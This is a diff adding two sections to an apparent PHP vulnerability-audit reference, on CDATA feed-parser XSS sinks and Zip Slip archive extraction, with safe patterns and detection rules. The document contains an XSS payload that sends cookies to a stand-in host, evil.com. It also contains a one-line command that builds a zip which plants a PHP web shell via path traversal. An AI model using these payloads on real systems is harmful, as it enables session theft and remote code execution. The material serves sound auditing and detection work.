@@ -138,3 +138,41 @@ Any file read function combined with `php://filter/convert.iconv.UTF-8.ISO-2022-
 - SHA1 magic hashes exist too
 - `password_verify()` is safe (always strict)
 - `hash_equals()` is safe (timing-safe + strict)
+
+---
+
+## CDATA / Feed Parser XSS Sinks
+
+RSS/Atom feed parsers that render `CDATA` content as HTML without sanitization. CDATA blocks bypass XML-level escaping — the content inside `<![CDATA[...]]>` is treated as raw text by the XML parser but rendered as HTML by the display layer.
+
+**Vulnerable patterns:**
+- `simplexml_load_string()` → accessing `->description` or `->content` → echoing without `htmlspecialchars()`
+- `DOMDocument::loadXML()` → `$node->textContent` or `$node->nodeValue` from CDATA → direct output
+- `XMLReader` → reading CDATA nodes → rendering in HTML template
+- WordPress `fetch_feed()` / SimplePie → custom templates rendering `$item->get_description()` with `|raw` or without escaping
+- Any RSS aggregator, feed reader, or podcast app displaying feed content
+
+**Payload:** `<![CDATA[<img src=x onerror="fetch('//evil.com/'+document.cookie)">]]>` inside `<description>` or `<content:encoded>`
+
+**Why it bypasses:** XML parsers don't escape CDATA content (by spec). If the app treats XML parsing as "input sanitization", the HTML payload passes through untouched to the rendering layer.
+
+---
+
+## Archive Extraction Sinks (Zip Slip)
+
+File extraction functions vulnerable to path traversal via crafted archive entries containing `../` in filenames.
+
+**Vulnerable functions:**
+- `ZipArchive::extractTo()` — extracts all files to target directory, does NOT validate entry paths. A zip entry named `../../../etc/cron.d/shell` writes outside the intended directory
+- `PclZip::extract()` — same vulnerability, `PCLZIP_OPT_PATH` does not prevent traversal in entry names
+- `PharData::extractTo()` — extracts tar/zip archives, same path traversal risk
+- `tar` via `exec()`/`system()` — `tar xf` without `--strip-components` or path validation
+
+**Exploitation:**
+1. Create malicious archive: `python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.writestr('../../shell.php','<?php system($_GET[\"cmd\"]);?>'); z.close()"`
+2. Upload to target's file upload endpoint
+3. Target extracts → `shell.php` written to web root or other writable directory above extraction path
+
+**Safe pattern:** After extraction, validate every extracted file's real path starts with the intended directory: `realpath($extracted) starts with realpath($target_dir)`
+
+**SAST detection:** Semgrep `php.lang.security.ziparchive-extractto-no-validation`, grep for `extractTo(` or `PclZip` without subsequent `realpath()` / `str_starts_with()` checks
